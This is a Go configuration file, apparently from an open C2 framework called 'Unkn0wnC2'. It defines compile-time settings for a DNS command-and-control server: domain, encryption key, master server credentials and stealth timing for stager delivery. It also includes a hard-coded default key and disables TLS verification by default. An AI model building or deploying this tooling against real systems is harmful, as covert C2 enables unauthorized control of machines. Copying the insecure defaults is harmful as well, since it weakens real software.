// Package main implements configuration management for the Unkn0wnC2 DNS C2 server.
// This file handles embedded build-time configuration only.
// No external config files are used - all settings are compiled into the binary.
package main

import (
	"fmt"
)

// Config holds runtime settings for the DNS server.
// All configuration values are embedded at build time except:
// - BindAddr: Can be overridden via -bind-addr flag
// - BindPort: Can be overridden via -bind-port flag
// - Debug: Can be enabled via -d flag
//
// Configuration fields:
// - Domain: the domain we're authoritative for (e.g., "secwolf.net")
// - NS1, NS2: name server hostnames for this domain
// - ForwardDNS: whether to forward non-authoritative queries to upstream DNS
// - UpstreamDNS: upstream DNS server to forward queries to (e.g., "8.8.8.8:53")
// - EncryptionKey: AES key for C2 traffic encryption
// - MasterServer: URL of master server (REQUIRED - set at build time)
// - MasterAPIKey: API key for authentication with master server (REQUIRED - set at build time)
// - MasterServerID: Unique identifier for this DNS server (REQUIRED - set at build time)
type Config struct {
	BindAddr          string       `json:"bind_addr"`
	BindPort          int          `json:"bind_port"`
	SvrAddr           string       `json:"server_address"`
	Domain            string       `json:"domain"`
	NS1               string       `json:"ns1"`
	NS2               string       `json:"ns2"`
	ForwardDNS        bool         `json:"forward_dns"`
	UpstreamDNS       string       `json:"upstream_dns"`
	EncryptionKey     string       `json:"encryption_key"`
	Debug             bool         `json:"debug"`
	StagerJitter      StagerJitter `json:"stager"`
	MasterServer      string       `json:"master_server"`       // Master server URL (e.g., "https://master.example.com")
	MasterAPIKey      string       `json:"master_api_key"`      // API key for master authentication
	MasterServerID    string       `json:"master_server_id"`    // Unique ID for this DNS server
	MasterTLSCACert   string       `json:"master_tls_ca_cert"`  // Optional: CA certificate path for Master TLS verification
	MasterTLSInsecure bool         `json:"master_tls_insecure"` // If true, skip TLS verification (default: true, Master binds to runtime IP)
}

// StagerJitter holds timing configuration for stager chunk delivery
type StagerJitter struct {
	JitterMinMs       int `json:"jitter_min_ms"`       // Minimum delay between chunks (ms)
	JitterMaxMs       int `json:"jitter_max_ms"`       // Maximum delay between chunks (ms)
	ChunksPerBurst    int `json:"chunks_per_burst"`    // Chunks before burst pause
	BurstPauseMs      int `json:"burst_pause_ms"`      // Pause between bursts (ms)
	RetryDelaySeconds int `json:"retry_delay_seconds"` // Delay between retries
	MaxRetries        int `json:"max_retries"`         // Maximum retry attempts
}

// DefaultConfig returns sensible defaults used as template during builds.
// This function is NOT used at runtime - all values are embedded during compilation.
// The builder replaces values in tryLoadEmbeddedConfig() to create the final binary.
func DefaultConfig() Config {
	return Config{
		BindAddr:      "0.0.0.0",
		BindPort:      53,
		SvrAddr:       "1.2.3.4",
		Domain:        "example.com",
		NS1:           "ns1.example.com",
		NS2:           "ns2.example.com",
		ForwardDNS:    true,
		UpstreamDNS:   "8.8.8.8:53",
		EncryptionKey: "MySecretC2Key123!@#DefaultChange",
		Debug:         false,
		StagerJitter: StagerJitter{
			JitterMinMs:       60000,  // 60 seconds - production stealth default
			JitterMaxMs:       120000, // 120 seconds
			ChunksPerBurst:    5,      // Moderate burst size
			BurstPauseMs:      120000, // 120 seconds between bursts
			RetryDelaySeconds: 3,
			MaxRetries:        5,
		},
		MasterServer:      "", // REQUIRED: Set by builder
		MasterAPIKey:      "", // REQUIRED: Set by builder
		MasterServerID:    "dns1",
		MasterTLSCACert:   "",   // Optional: Path to CA cert for production
		MasterTLSInsecure: true, // Default: Skip TLS verification (Master uses runtime IP binding)
	}
}

// IsDistributedMode returns true - this server only operates in distributed mode
func (c *Config) IsDistributedMode() bool {
	return true
}

// LoadConfig returns the embedded configuration built at compile time.
// All configuration is embedded in the binary - no external config files needed.
// Only bind address can be overridden at runtime via command line flag.
func LoadConfig() (Config, error) {
	// Load embedded configuration (set at build time)
	cfg, hasEmbedded := tryLoadEmbeddedConfig()
	if !hasEmbedded {
		return cfg, fmt.Errorf("no embedded configuration found - binary was not built correctly")
	}

	return cfg, nil
}

// tryLoadEmbeddedConfig attempts to load embedded configuration
// Returns the config and true if embedded config is available, otherwise returns empty config and false
// NOTE: This function is modified at build time to embed actual configuration values
func tryLoadEmbeddedConfig() (Config, bool) {
	// Embedded configuration from build time
	// These values are replaced by the builder during compilation
	embeddedConfig := Config{
		BindAddr:      "0.0.0.0",
		BindPort:      53,
		SvrAddr:       "1.2.3.4",
		Domain:        "example.com",
		NS1:           "ns1.example.com",
		NS2:           "ns2.example.com",
		ForwardDNS:    true,
		UpstreamDNS:   "8.8.8.8:53",
		EncryptionKey: "MySecretC2Key123!@#DefaultChange",
		Debug:         false,
		StagerJitter: StagerJitter{
			JitterMinMs:       60000,
			JitterMaxMs:       120000,
			ChunksPerBurst:    5,
			BurstPauseMs:      120000,
			RetryDelaySeconds: 3,
			MaxRetries:        5,
		},
		MasterServer:      "",
		MasterAPIKey:      "",
		MasterServerID:    "dns1",
		MasterTLSCACert:   "",
		MasterTLSInsecure: true,
	}

	// Check if this is a properly built binary (MasterServer must be set)
	if embeddedConfig.MasterServer == "" {
		return embeddedConfig, false
	}

	return embeddedConfig, true
}
